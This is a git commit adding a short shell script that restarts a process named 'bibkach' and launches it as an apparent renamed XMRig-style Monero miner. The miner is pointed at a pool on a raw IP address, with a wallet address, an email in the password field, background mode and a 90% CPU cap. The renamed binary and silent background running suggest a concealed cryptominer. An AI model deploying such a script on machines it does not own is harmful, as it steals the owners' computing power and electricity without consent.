277095e62ceed53eefdae50de7bc18d5c8fb38a0
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-18 20:44:33 +0200

    Add files via upload

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill bibkach
+sleep 7
+bibkach -o 95.216.184.240:2121 -u 44X3tNzFXwZet6y87T1R61gqzBZ9f4yMH9ur4baLxTeEDnfkyJKqRcTEtkqXMfZ6BhTqB8jgYSP5YRbtjAEHRjeqBozqe29 --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
